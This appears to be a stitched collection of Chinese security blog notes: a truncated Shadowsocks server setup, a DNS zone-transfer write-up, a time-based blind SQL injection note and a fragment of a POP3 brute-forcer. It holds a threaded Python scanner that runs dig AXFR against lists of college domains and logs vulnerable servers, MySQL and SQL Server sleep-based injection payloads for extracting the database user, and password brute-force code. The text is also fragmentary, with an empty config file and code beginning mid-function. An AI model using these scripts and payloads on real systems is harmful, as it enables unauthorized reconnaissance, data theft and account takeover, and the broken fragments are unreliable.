ShadowSocks配置

服务端：

过程

apt-get install python-pip
pip install shadowsocks
# 或者git clone git://github.com/madeye/shadowsocks-libev.git
find / -name shadowsocks #看看装在哪里了
mkdir shadowsocks        #在etc目录下新建名为shadowsocks的文件夹
vim config.json          #新建名为config.json的文件写入一下内容

{

/usr/local/bin/ssserver –c /etc/shadowsocks/config.json

在VPS的web管理界面重启VPS。

DNS域传送漏洞学习记录

发表于 2015-10-12   |  

最近研究了一下DNS域传送漏洞,这里记录一下学习结果

DNS域传送漏洞概述

DNS服务提供了域名到IP的映射,服务端口通常为53.DNS服务器分为三类:主服务器,备份服务器,缓存服务器.其中备份服务器同步主服务器的过程为域传送.
当DNS服务器配置不当时可能导致任何匿名用户都可以获得整个域的所有记录,整个网络结构就暴漏给了攻击者.危害也就不言而喻了.

常见的DNS记录有以下几类

类别 说明
A ip地址映射
AAAA ipv6地址映射
CHAME 别名
NS 域名记录
MX 邮箱交换记录
PTR 反向记录
TXT 邮箱信息

nslookup命令检测域传送漏洞

1.非交互式

cmd> nslookup -type=ns baidu.com
#查看baidu.com此域名被哪个dns服务器解析
cmd> nslookup -type=ptr 8.8.8.8
#反向查看8.8.8.8的域名

2.交互式

cmd> nslookup #进入交互
cmd> server dns.baidu.com #指定dnsserver
cmd> ls baidu.com #列出所有记录

可以写一个bat脚本保存为 dnstest.bat

echo ls %1 | nslookup - %2

在使用时格式如下:

dnstest baidu.com dns.baidu.com
#param1中写入访问域名
#param2中写入dns地址

lock = threading.Lock()
c_index = 0
def test_DNS_Servers():
    global c_index
    while True:
        lock.acquire()
        if c_index >= len(colleges):
            lock.release()
            break    # End of list
        domain = colleges[c_index].lstrip('www.')
        c_index += 1
        lock.release()
        cmd_res = os.popen('nslookup -type=ns ' + domain).read()    # fetch DNS Server List
        print domain
        dns_servers = re.findall('nameserver = ([\w\.]+)', cmd_res)
        for server in dns_servers:
            if len(server) < 5: server += domain
            cmd_res = os.popen(os.getcwd() + '\\BIND9\\dig @%s axfr %s' % (server, domain)).read()
            if cmd_res.find('Transfer failed.') < 0 and \
               cmd_res.find('connection timed out') < 0 and \
               cmd_res.find('XFR size') > 0 :
                lock.acquire()
                print '*' * 10 +  ' Vulnerable dns server found:', server, '*' * 10
                lock.release()
                with open('vulnerable_hosts.txt', 'a') as f:
                    f.write('%s    %s\n' % (server.ljust(30), domain))
                with open('dns\\' + server + '.txt', 'w') as f:
                    f.write(cmd_res)           
threads = []
for i in range(10):
    t = threading.Thread(target=test_DNS_Servers)
    t.start()
    threads.append(t)
for t in threads:
    t.join()

昨天找到个延时注入,sqlmap跑出来数据库类型,试了下sqlmap生成payload好使,就自己动手写一个脚本验证一下.
记录下实现过程:

实现逻辑

try:
    发送payload
    payload = "aaa';sleep(10)"
    conn = httplib.HTTPConnection(host,timeout = 5);
    conn.request(method="POST",url="目标",body=payload,headers=headers);
    conn.getresponse()
    conn.close()
expect:
    如果发现异常说明当前payload判断正确

MYSQL相关函数

在mysql中注入payload可能是这样的

aaa,;if(ascii(mid(lower(user()),1,1),sleep(8),0))=97

说明:
1.当前用户(user)小写(lower)第一个字母(mid)的ascii码(ascii)等于97时延时(sleep)8秒.
2.mid(p1,p2,p3) p1为字符串,p2为起始位置,p3长度
3.在python中可以使用ord(“s”)来对应小写字母s的ascii码

SQLSERVER相关函数

在sqlserver中payload可能是这样的

username=aa';if(ascii(substring(system_user,%d,1))=%d) begin WAITFOR DELAY '0:0:10' end--" % (i,ord(s))

说明:
1.当前用户(system_user)第i个字母(substring)的ascii码(ascii)等于小写字母s对应的ascii码(ord)时,延时(WAITFOR DELAY)10秒.
2.substring(p1,p2,p3) p1为字符串,p2为起始位置,p3长度,和mysql中的mid函数功能类似
3.ord是python内建函数,其他的函数是在目标数据库中执行的.

  print "Bruting..."
  for user in listuser: 
    for value in listpwd : 
      user = user.replace("\n",suffix) 
      value = value.replace("\n","") 
      try: 
        pop = poplib.POP3(server,110,delay) 
        pop.user(user) 
        auth = pop.pass_(value)

        pop.quit() 
      except:
        pass
mailbruteforce(users,words)
